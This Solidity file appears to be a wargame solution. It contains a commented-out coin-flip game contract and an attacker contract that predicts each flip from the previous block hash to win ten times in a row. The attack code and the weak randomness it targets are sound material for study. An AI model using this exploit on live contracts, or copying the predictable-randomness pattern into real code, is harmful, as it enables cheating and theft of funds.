// SPDX-License-Identifier: MIT

//guess the winning streak of the game. 10 in a row
pragma solidity ^0.8.0;

// contract CoinFlip {

//   uint256 public consecutiveWins;
//   uint256 lastHash;
//   uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

//   constructor() {
//     consecutiveWins = 0;
//   }

//   function flip(bool _guess) public returns (bool) {
//     uint256 blockValue = uint256(blockhash(block.number - 1));

//     if (lastHash == blockValue) {
//       revert();
//     }

//     lastHash = blockValue;
//     uint256 coinFlip = blockValue / FACTOR;
//     bool side = coinFlip == 1 ? true : false;

//     if (side == _guess) {
//       consecutiveWins++;
//       return true;
//     } else {
//       consecutiveWins = 0;
//       return false;
//     }
//   }
// }
// the hack is to create a counter contract that gets the right side and plays it for us.
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {
    uint256 public consecutiveWins = 0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function coinFlipGuess(address _coinFlipAddr) external returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool isRight = ICoinFlip(_coinFlipAddr).flip(side);
        if (isRight) {
            consecutiveWins++;
        } else {
            consecutiveWins = 0;
        }

        return consecutiveWins;
    }
}